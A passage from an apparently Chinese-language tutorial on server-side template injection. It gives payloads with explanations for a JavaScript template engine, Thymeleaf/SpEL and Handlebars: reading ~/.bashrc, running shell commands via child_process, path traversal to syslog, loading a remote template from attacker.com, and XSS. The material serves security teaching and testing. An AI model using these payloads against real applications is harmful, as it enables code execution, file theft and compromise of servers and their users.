    * 原理：使用 Node.js 的 `fs` 模块读取项目根目录下的 `package.json` 文件内容。
* 读取用户主目录下的 `.bashrc` 文件（Linux 系统）
    * 输入：`<% var fs = require('fs'); console.log(fs.readFileSync(process.env.HOME + '/.bashrc', 'utf8')) %>`
    * 原理：通过 `process.env.HOME` 获取用户主目录路径，然后读取 `.bashrc` 文件内容。

##### 执行系统命令

* 创建一个新文件
    * 输入：`<% var { execSync } = require('child_process'); execSync('touch /tmp/test.txt') %>`
    * 原理：使用 `child_process` 模块的 `execSync` 方法执行 `touch` 命令创建一个新文件。
* 下载一个文件（使用 `wget`）
    * 输入：`<% var { execSync } = require('child_process'); execSync('wget http://example.com/file.txt -O /tmp/downloaded.txt') %>`
    * 原理：执行 `wget` 命令从指定 URL 下载文件并保存到本地。

#### （5），Thymeleaf（Java，常用于 Spring Boot）

##### 利用 Java 反射执行代码

* 获取系统属性
    * 输入：`${T(java.lang.System).getProperties()}`
    * 原理：通过 Java 反射调用 `System` 类的 `getProperties` 方法获取系统属性。
* 执行 Java 代码创建文件
    * 输入：`${T(java.io.File).createTempFile('test', '.txt')}`
    * 原理：使用反射调用 `File` 类的 `createTempFile` 方法创建一个临时文件。

##### 利用 Spring 上下文获取 Bean

* 假设存在一个名为 `userService` 的 Bean
    * 输入：`${@userService.getUserById(1)}`
    * 原理：通过 Spring 表达式语言（SpEL）从 Spring 上下文中获取 `userService` Bean，并调用其 `getUserById` 方法。

#### （6），Handlebars（JavaScript）

##### 结合动态部分模板加载漏洞

* 尝试读取不同目录下的文件
    * 输入：`{ {> ../../../../var/log/syslog }}`（假设应用未对路径进行严格验证，适用于 Linux 系统）
    * 原理：利用部分模板加载机制，尝试读取系统日志文件。
* 尝试加载远程文件（若应用存在协议绕过漏洞）
    * 输入：`{ {> http://attacker.com/malicious_template.hbs }}`
    * 原理：如果应用在加载部分模板时未对 URL 进行严格验证，可能会加载远程恶意模板。

##### 结合 JavaScript 注入（若与 JavaScript 交互）

* 假设 Handlebars 模板用于生成 JavaScript 代码
    * 输入：`{ { '" + alert("XSS") + "' }}`
    * 原理：如果模板输出被嵌入到 JavaScript 代码中，可能会导致 XSS 漏洞，弹出警告框。